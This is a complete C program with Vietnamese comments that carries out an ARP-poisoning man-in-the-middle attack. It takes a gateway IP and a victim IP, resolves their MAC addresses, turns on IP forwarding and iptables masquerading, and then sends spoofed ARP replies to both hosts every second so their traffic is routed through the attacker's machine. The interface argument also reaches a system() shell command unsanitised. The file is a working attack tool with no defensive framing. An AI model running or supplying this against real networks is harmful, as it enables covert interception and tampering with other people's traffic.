#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>	// Lay MAC
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <net/if.h>

// Định nghĩa các hằng số
#define HARDWARE_LENGTH 6
#define IP_LENGTH 4
#define IP_MAXPACKET 65535
#define SPOOFED_PACKET_SEND_DELAY 1
#define FALSE 0
#define TRUE 1
#define ETH_HEADER_LENGTH 14
#define ARP_HEADER_LENGTH 28

// Biến toàn cục để dọn dẹp
static int global_sd = -1;
static uint8_t *global_my_mac = NULL, *global_victim_mac = NULL, *global_gateway_mac = NULL;
static char *global_interface = NULL;

// Định nghĩa cấu trúc packet
typedef struct s_arp_packet {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_len;
    uint8_t protocol_len;
    uint16_t opcode;
    uint8_t sender_mac[HARDWARE_LENGTH];
    uint8_t sender_ip[IP_LENGTH];
    uint8_t target_mac[HARDWARE_LENGTH];
    uint8_t target_ip[IP_LENGTH];
} t_arp_packet;

typedef struct s_ethernet_packet {
    uint8_t destination_mac_address[HARDWARE_LENGTH];
    uint8_t source_mac_address[HARDWARE_LENGTH];
    uint16_t ether_type;
} t_ethernet_packet;

// Macro debug
#define PRINT_MAC_ADDRESS(mac) \
    for (int i = 0; i < HARDWARE_LENGTH; i++) \
        fprintf(stdout, "%02x%s", mac[i], i == HARDWARE_LENGTH - 1 ? "" : ":")

// Hàm tạo packet
t_arp_packet *create_arp_packet(const uint16_t opcode,
                              const uint8_t *my_mac_address, const char *spoofed_ip_source,
                              const uint8_t *destination_mac_address, const char *destination_ip) {
    t_arp_packet *arp_packet;
    if (!(arp_packet = malloc(sizeof(t_arp_packet))))
        return NULL;
    arp_packet->hardware_type = htons(1);
    arp_packet->protocol_type = htons(ETH_P_IP);
    arp_packet->hardware_len = HARDWARE_LENGTH;
    arp_packet->protocol_len = IP_LENGTH;
    arp_packet->opcode = htons(opcode);
    memcpy(arp_packet->sender_mac, my_mac_address, HARDWARE_LENGTH);
    memcpy(arp_packet->target_mac, destination_mac_address, HARDWARE_LENGTH);
    if (inet_pton(AF_INET, spoofed_ip_source, arp_packet->sender_ip) != 1
        || inet_pton(AF_INET, destination_ip, arp_packet->target_ip) != 1) {
        free(arp_packet);
        return NULL;
    }
    return arp_packet;
}

t_ethernet_packet *create_ethernet_packet(const uint8_t *src_mac,
                                        const uint8_t *dest_mac,
                                        const t_arp_packet *arp_packet) {
    t_ethernet_packet *ethernet_packet;
    if (!(ethernet_packet = malloc(sizeof(uint8_t) * IP_MAXPACKET)))
        return NULL;
    memcpy(ethernet_packet->destination_mac_address, dest_mac, HARDWARE_LENGTH);
    memcpy(ethernet_packet->source_mac_address, src_mac, HARDWARE_LENGTH);
    uint8_t ether_type[2] = {ETH_P_ARP / 256, ETH_P_ARP % 256};
    memcpy(&ethernet_packet->ether_type, ether_type, 2); // Sửa lỗi
    memcpy((uint8_t *)ethernet_packet + ETH_HEADER_LENGTH, arp_packet, ARP_HEADER_LENGTH);
    return ethernet_packet;
}

// Hàm mạng
char send_packet_to_broadcast(const int sd,
                            struct sockaddr_ll *device,
                            const uint8_t *my_mac_address,
                            const char *source_ip,
                            const char *target_ip) {
    t_ethernet_packet *ethernet_packet;
    t_arp_packet *arp_packet;
    uint8_t broadcast_addr[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    if (!(arp_packet = create_arp_packet(ARPOP_REQUEST, my_mac_address, source_ip, broadcast_addr, target_ip)))
        return FALSE;

    if (!(ethernet_packet = create_ethernet_packet(my_mac_address, broadcast_addr, arp_packet))) {
        free(arp_packet);
        return FALSE;
    }

    if (sendto(sd, ethernet_packet, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
               (const struct sockaddr *)device, sizeof(*device)) <= 0) {
        free(arp_packet);
        free(ethernet_packet);
        return FALSE;
    }

    free(arp_packet);
    free(ethernet_packet);
    return TRUE;
}

uint8_t *get_target_response(const int sd, const char *target_ip) {
    char buffer[IP_MAXPACKET];
    t_ethernet_packet *ethernet_packet;
    t_arp_packet *arp_packet;
    uint8_t *target_mac_address;
    char uint8_t_to_str[INET_ADDRSTRLEN] = {0};

    if (!(target_mac_address = malloc(HARDWARE_LENGTH)))
        return NULL;
    while (TRUE) {
        if (recvfrom(sd, buffer, IP_MAXPACKET, 0, NULL, NULL) <= 0) {
            free(target_mac_address);
            return NULL;
        }

        ethernet_packet = (t_ethernet_packet *)buffer;
        if (ntohs(ethernet_packet->ether_type) != ETH_P_ARP)
            continue;

        arp_packet = (t_arp_packet *)(buffer + ETH_HEADER_LENGTH);
        if (ntohs(arp_packet->opcode) != ARPOP_REPLY
            || !inet_ntop(AF_INET, arp_packet->sender_ip, uint8_t_to_str, INET_ADDRSTRLEN)
            || strcmp(uint8_t_to_str, target_ip)) {
            memset(uint8_t_to_str, 0, INET_ADDRSTRLEN);
            continue;
        }

        memcpy(target_mac_address, arp_packet->sender_mac, HARDWARE_LENGTH);
        fprintf(stdout, "[+] %s MAC: ", target_ip);
        PRINT_MAC_ADDRESS(target_mac_address);
        fprintf(stdout, "\n");
        return target_mac_address;
    }
}

char send_poison_packet(const int sd,
                       struct sockaddr_ll *device,
                       const uint8_t *my_mac_address,
                       const char *spoofed_ip,
                       const uint8_t *target_mac,
                       const char *target_ip) {
    t_ethernet_packet *ethernet_packet;
    t_arp_packet *arp_packet;

    if (!(arp_packet = create_arp_packet(ARPOP_REPLY, my_mac_address, spoofed_ip, target_mac, target_ip)))
        return FALSE;

    if (!(ethernet_packet = create_ethernet_packet(my_mac_address, target_mac, arp_packet))) {
        free(arp_packet);
        return FALSE;
    }

    if (sendto(sd, ethernet_packet, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
               (const struct sockaddr *)device, sizeof(*device)) <= 0) {
        free(arp_packet);
        free(ethernet_packet);
        return FALSE;
    }

    free(arp_packet);
    free(ethernet_packet);
    return TRUE;
}

// Hàm tiện ích
void usage(const char prog_name[]) {
    fprintf(stderr, "Usage: %s <gateway_ip> <victim_ip> <interface>\n", prog_name);
}

uint8_t *get_my_mac_address(const char *interface) {
    int sd;
    struct ifreq ifr;
    uint8_t *mac;

    if ((sd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        fprintf(stderr, "Error: Could not create socket for MAC retrieval\n");
        return NULL;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sd, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "Error: Could not get MAC address for %s\n", interface);
        close(sd);
        return NULL;
    }

    if (!(mac = malloc(HARDWARE_LENGTH))) {
        fprintf(stderr, "Error: Memory allocation failed\n");
        close(sd);
        return NULL;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, HARDWARE_LENGTH);
    close(sd);

    fprintf(stdout, "[+] My MAC: ");
    PRINT_MAC_ADDRESS(mac);
    fprintf(stdout, "\n");
    return mac;
}

int get_index_from_interface(struct sockaddr_ll *device, const char *interface) {
    device->sll_ifindex = if_nametoindex(interface);
    device->sll_family = AF_PACKET;
    device->sll_halen = HARDWARE_LENGTH;

    if (!device->sll_ifindex) {
        fprintf(stderr, "Error: Could not get interface index for %s\n", interface);
        return FALSE;
    }
    return TRUE;
}

void setup_network(const char *interface) {
    char cmd[256];

    FILE *fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
    if (!fp) {
        fprintf(stderr, "Error: Could not enable IP forwarding (need root?)\n");
    } else {
        fprintf(fp, "1");
        fclose(fp);
        fprintf(stdout, "[+] IP forwarding enabled\n");
    }

    snprintf(cmd, sizeof(cmd), "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "iptables -P FORWARD ACCEPT");
    system(cmd);
    fprintf(stdout, "[+] Network configured for %s\n", interface);
}

void cleanup_network(const char *interface) {
    char cmd[256];

    FILE *fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
    if (fp) {
        fprintf(fp, "0");
        fclose(fp);
        fprintf(stdout, "[+] IP forwarding disabled\n");
    }

    snprintf(cmd, sizeof(cmd), "iptables -t nat -D POSTROUTING -o %s -j MASQUERADE", interface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "iptables -P FORWARD DROP");
    system(cmd);
    fprintf(stdout, "[+] Network cleaned up\n");

    if (global_my_mac) free(global_my_mac);
    if (global_victim_mac) free(global_victim_mac);
    if (global_gateway_mac) free(global_gateway_mac);
    if (global_sd != -1) close(global_sd);
}

void signal_handler(int sig) {
    fprintf(stdout, "[+] Caught signal %d, cleaning up...\n", sig);
    cleanup_network(global_interface);
    exit(EXIT_SUCCESS);
}

// Main
int main(int argc, char *argv[]) {
    char *gateway_ip, *victim_ip, *interface;
    uint8_t *my_mac_address, *victim_mac, *gateway_mac;
    struct sockaddr_ll device;
    int sd;

    if (argc != 4) {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    gateway_ip = argv[1];
    victim_ip = argv[2];
    interface = argv[3];
    global_interface = interface;

    signal(SIGINT, signal_handler);

    if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
        fprintf(stderr, "Error: Socket creation failed\n");
        return EXIT_FAILURE;
    }
    global_sd = sd;

    if (!(my_mac_address = get_my_mac_address(interface))) {
        close(sd);
        return EXIT_FAILURE;
    }
    global_my_mac = my_mac_address;

    memset(&device, 0, sizeof(device));
    if (!get_index_from_interface(&device, interface)) {
        free(my_mac_address);
        close(sd);
        return EXIT_FAILURE;
    }

    setup_network(interface);

    if (!send_packet_to_broadcast(sd, &device, my_mac_address, gateway_ip, victim_ip) ||
        !(victim_mac = get_target_response(sd, victim_ip))) {
        cleanup_network(interface);
        return EXIT_FAILURE;
    }
    global_victim_mac = victim_mac;

    if (!send_packet_to_broadcast(sd, &device, my_mac_address, victim_ip, gateway_ip) ||
        !(gateway_mac = get_target_response(sd, gateway_ip))) {
        cleanup_network(interface);
        return EXIT_FAILURE;
    }
    global_gateway_mac = gateway_mac;

    fprintf(stdout, "[+] Starting MITM ARP Poisoning...\n");
    while (TRUE) {
        if (!send_poison_packet(sd, &device, my_mac_address, gateway_ip, victim_mac, victim_ip) ||
            !send_poison_packet(sd, &device, my_mac_address, victim_ip, gateway_mac, gateway_ip)) {
            cleanup_network(interface);
            return EXIT_FAILURE;
        }
        sleep(SPOOFED_PACKET_SEND_DELAY);
    }

    cleanup_network(interface);
    return EXIT_SUCCESS;
}
